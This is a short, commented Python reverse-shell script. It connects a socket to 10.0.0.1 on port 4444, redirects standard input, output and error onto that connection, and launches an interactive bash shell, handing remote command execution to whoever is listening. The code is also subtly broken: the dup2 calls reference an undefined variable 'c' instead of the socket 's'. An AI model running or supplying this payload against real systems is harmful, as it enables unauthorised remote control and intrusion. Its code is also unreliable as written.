#!/usr/bin/python

# Mandatory imports in order to run the subsequent code
import socket, subprocess, os;

# Socket creation
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);

# Socket connection to the target
s.connect(("10.0.0.1",4444));

# File descriptors duplication (STDIN, STDOUT, STDERR)
os.dup2(c.fileno(),0);
os.dup2(c.fileno(),1);
os.dup2(c.fileno(),2);

# Command shell spawning
p=subprocess.call(["/bin/bash","-i"])
